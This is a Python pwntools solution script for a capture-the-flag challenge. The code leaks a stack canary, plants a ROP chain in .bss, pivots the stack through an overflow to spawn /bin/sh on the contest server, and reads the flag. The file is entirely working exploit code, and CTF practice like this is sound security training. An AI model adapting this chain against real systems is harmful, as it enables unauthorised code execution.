#!/usr/bin/env python3

from pwn import *
import re

e = ELF("./bin/doMonkeysSwim")
context.binary = e

# context.log_level = "debug"
gdbscript = """
b *0x401ccc
"""

# =========================
#        CONNECTION
# =========================

def conn():
    if args.LOCAL:
        r = process([e.path])
    else:
        r = remote("dms.ctf.ritsec.club", 1400)
    return r

# =========================
#        GET FLAG
# =========================

FLAG_RE = re.compile(rb"RS{[\w\d!?:]*}")

def grab_flag(r, name: str = "flag.txt"):
    if not args.LOCAL:
        r.sendline(str(f"cat {name}").encode())
        data = r.recvall(timeout=1)

        m = FLAG_RE.search(data)
        if m:
            flag = m.group(0).decode("ascii", errors="ignore")
            print(flag, flush=True)
        else:
            text = data.decode("ascii", errors="ignore")
            print(text, flush=True)

# =========================
#        LEAK HELPERS
# =========================

HEX_ADDR_RE = rb"0x[0-9a-fA-F]+"

def leak_hex(data: bytes, all: bool = False, pattern: bytes = HEX_ADDR_RE):
    matches = re.findall(pattern, data)
    if not matches:
        log.failure(f"No hex address found in: {data!r}")
        raise ValueError("no hex address found")

    leaks = [int(m, 16) for m in matches]

    if all:
        log.success(f"Found {len(leaks)} leaks: {[hex(x) for x in leaks]}")
        return leaks

    leak = leaks[0]
    log.success(f"Found leak: {hex(leak)}")
    return leak


def leak_canary(r: process|remote) -> int:
    r.sendlineafter(b">> ", b"3")
    r.recvuntil(b"later", timeout=1)
    r.sendline(b"3") # Index 3 targets the stack canary

    r.recvuntil(b"this: ")
    return leak_hex(r.recvline().strip())

# =========================
#           MAIN
# =========================

def main():
    r = conn()
    if args.DBG:
        gdb.attach(r, gdbscript=gdbscript)

    # 1. Leak the Canary
    canary = leak_canary(r)

    # 2. Setup Stack Pivot addresses
    start = 0x4cca60
    fake_rbp = start + 0x8 

    # 3. Define Gadgets
    syscall = 0x401f26
    pop_rax = 0x401f49
    pop_rdi = 0x401f43
    pop_rsi = 0x401f45
    pop_rdx = 0x401f47

    # 4. Construct ROP Chain
    rop_chain = b""
    rop_chain += p64(canary)       # Canary for the BSS stack
    rop_chain += p64(fake_rbp)     # Fake RBP 
    rop_chain += p64(pop_rax) 
    rop_chain += p64(59)           # execve syscall number
    rop_chain += p64(pop_rdi) 
    rop_chain += p64(start + 0x58) # Pointer to "/bin/sh\x00" at the end of the chain
    rop_chain += p64(pop_rsi)
    rop_chain += p64(0)
    rop_chain += p64(pop_rdx)
    rop_chain += p64(0)
    rop_chain += p64(syscall)      # Trigger execve
    rop_chain += b"/bin/sh\x00"    # Our target string, lands exactly at start + 0x58

    # 5. Write ROP chain to .bss via monkey_swaperoo
    r.sendlineafter(b">> ", b"5")
    r.sendlineafter(b": ", rop_chain)
    r.sendlineafter(b": ", b"a")

    # 6. Smash the stack via monkey_do and overwrite RBP
    r.sendlineafter(b">> ", b"4")
    # 24 bytes of padding + the valid canary + 7 bytes of our fake RBP
    r.sendline(b"A"*24 + p64(canary) + p64(fake_rbp)[:7]) 

    # 7. Exit loop to trigger epilogue and pivot!
    r.sendlineafter(b">> ", b"6")

    # Pwned.
    grab_flag(r)
    r.interactive()


if __name__ == "__main__":
    main()